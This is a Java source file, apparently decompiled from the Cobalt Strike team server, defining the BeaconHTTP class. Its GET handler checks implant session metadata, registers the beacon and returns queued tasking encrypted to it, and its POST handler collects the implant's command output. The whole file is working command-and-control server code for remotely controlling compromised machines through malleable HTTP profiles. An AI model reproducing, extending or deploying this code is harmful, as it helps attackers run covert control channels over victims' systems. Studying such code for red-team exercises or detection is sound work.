package beacon;

import c2profile.MalleableHook;
import c2profile.Profile;
import common.BeaconEntry;
import common.CommonUtils;
import common.MudgeSanity;
import common.ScListener;

import java.io.InputStream;
import java.util.Map;
import java.util.Properties;

import server.ServerUtils;

public class BeaconHTTP {
    
    protected MalleableHook.MyHook geth = new GetHandler();

    protected MalleableHook.MyHook posth = new PostHandler();

    protected BeaconC2 controller;

    protected Profile c2profile;

    protected ScListener listener;

    public BeaconHTTP(ScListener scListener, Profile profile, BeaconC2 beaconC2) {
        this.c2profile = profile;
        this.controller = beaconC2;
        this.listener = scListener;
    }

    public MalleableHook.MyHook getGetHandler() {
        return this.geth;
    }

    public MalleableHook.MyHook getPostHandler() {
        return this.posth;
    }

    protected String getPostedData(Properties properties) {
        if (properties.containsKey("input") && properties.get("input") instanceof InputStream) {
            InputStream inputStream = (InputStream) properties.get("input");
            byte[] arrby = CommonUtils.readAll(inputStream);
            return CommonUtils.bString(arrby);
        }
        return "";
    }

    private class PostHandler implements MalleableHook.MyHook {
        private PostHandler() {
        }

        public byte[] serve(String string1, String string2,
                            Properties properties, Properties properties2) {
            try {
                String str1 = "";
                String str2 = ServerUtils.getRemoteAddress(c2profile, properties);
                String str3 = getPostedData(properties2);
                str1 = new String(c2profile.recover(".http-post.client.id",
                        properties, properties2, str3, string1));
                if (str1.length() == 0) {
                    CommonUtils.print_error("HTTP " + string2 + " to " + string1 + " from "
                            + str2 + " has no session ID! This could be an error (or mid-engagement change) in your c2 profile");
                    MudgeSanity.debugRequest(".http-post.client.id",
                            (Map) properties, (Map) properties2, str3, string1, str2);
                } else {
                    byte[] arrby = CommonUtils.toBytes(
                            c2profile.recover(".http-post.client.output",
                                    properties, properties2, str3, string1));
                    if (arrby.length == 0 || !controller.process_beacon_data(str1, arrby)) {
                        MudgeSanity.debugRequest(".http-post.client.output",
                                (Map) properties, (Map) properties2, str3, string1, str2);
                    }
                }
            } catch (Exception exception) {
                MudgeSanity.logException("beacon post handler", exception, false);
            }
            return new byte[0];
        }
    }

    private class GetHandler implements MalleableHook.MyHook {
        private GetHandler() {
        }

        public byte[] serve(String string1, String string2, Properties properties, Properties properties2) {
            String str1 = ServerUtils.getRemoteAddress(c2profile, properties);
            String str2 = c2profile.recover(".http-get.client.metadata",
                    properties, properties2, getPostedData(properties2), string1);
            if (str2.length() == 0 || str2.length() != 128) {
                CommonUtils.print_error("Invalid session id");
                MudgeSanity.debugRequest(".http-get.client.metadata",
                        (Map) properties, (Map) properties2, "", string1, str1);
                return new byte[0];
            }
            BeaconEntry beaconEntry = controller.process_beacon_metadata(listener,
                    str1, CommonUtils.toBytes(str2), null, 0);
            if (beaconEntry == null) {
                MudgeSanity.debugRequest(".http-get.client.metadata",
                        (Map) properties, (Map) properties2, "", string1, str1);
                return new byte[0];
            }
            byte[] arrby = controller.dump(beaconEntry.getId(), 921600, 0x100000);
            if (arrby.length > 0) {
                return controller.getSymmetricCrypto().encrypt(beaconEntry.getId(), arrby);
            }
            return new byte[0];
        }
    }
}
